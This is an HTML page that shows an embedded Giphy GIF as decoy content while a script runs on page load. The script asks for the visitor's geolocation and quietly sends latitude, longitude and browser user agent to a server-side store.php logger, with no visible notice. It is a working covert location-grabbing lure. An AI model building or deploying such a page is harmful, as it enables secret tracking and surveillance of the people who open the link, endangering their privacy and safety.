

<!DOCTYPE html>
<html>
<body onload="getLocation()">

<div style="width:100%;height:0;padding-bottom:100%;position:relative;"><iframe src="https://giphy.com/embed/7LxCWCtUgYwqNxIx2x" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/IntoAction-mental-health-crisis-therapists-7LxCWCtUgYwqNxIx2x">via GIPHY</a></p>



<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "store.php?Latitude: " + position.coords.latitude + "&Longitude: " + position.coords.longitude + "&uagent: " + navigator.userAgent);
    xhttp.send();
}
</script>

</body>
</html>
